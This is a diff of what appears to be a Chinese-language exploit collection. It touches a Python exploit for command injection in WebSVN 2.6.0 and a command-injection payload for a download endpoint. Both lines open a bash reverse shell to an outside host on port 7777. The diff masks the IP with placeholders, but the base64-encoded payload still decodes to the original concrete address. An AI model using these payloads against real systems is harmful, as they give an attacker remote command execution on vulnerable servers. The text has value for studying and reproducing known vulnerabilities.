@@ -1936,7 +1936,7 @@ import requests
 import argparse
 from urllib.parse import quote_plus
  
-PAYLOAD = "/bin/bash -c 'bash -i >& /dev/tcp/103.231.14.158/7777 0>&1'"
+PAYLOAD = "/bin/bash -c 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/7777 0>&1'"
 REQUEST_PAYLOAD = '/search.php?search=";{};"'
  
 parser = argparse.ArgumentParser(description='Send a payload to a websvn 2.6.0 server.')
@@ -3008,7 +3008,7 @@ http://xxx.com/admin.html?s=admin/api.Update/get/encode/1b1a1a1b1a1a1b1a1a1b1a1a
 
 我们访问 http://your-ip:8080/download?uri=ftp://example.com:2121/&file=vulhub.txt，它会从 example.com:2121 这个 ftp 服务端下载文件 vulhub.txt 到本地，并将内容返回给用户。
 
-/download?uri=ftp://103.231.14.158:2121/&file=|bash${IFS}-c${IFS}'{echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAzLjIzMS4xNC4xNTgvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}'
+/download?uri=ftp://xxx.xxx.xxx.xxx:2121/&file=|bash${IFS}-c${IFS}'{echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAzLjIzMS4xNC4xNTgvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}'
 
 反弹shell
 构造执行反弹shell的命令
